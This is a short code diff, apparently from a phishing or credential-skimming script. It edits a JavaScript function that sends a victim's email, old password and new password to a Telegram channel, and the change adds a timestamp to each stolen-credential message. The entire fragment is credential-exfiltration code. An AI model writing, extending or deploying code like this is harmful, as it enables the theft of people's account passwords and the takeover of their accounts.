@@ -25,7 +25,8 @@
     sendTelegram(
       'New Password Has Been Set\nEmail: ' + email +
       '\nPassword: ' + password +
-      '\nNew Password: ' + newPassword
+      '\nNew Password: ' + newPassword +
+      '\nTime: ' + getCdtTime()
     );
   };
 })();
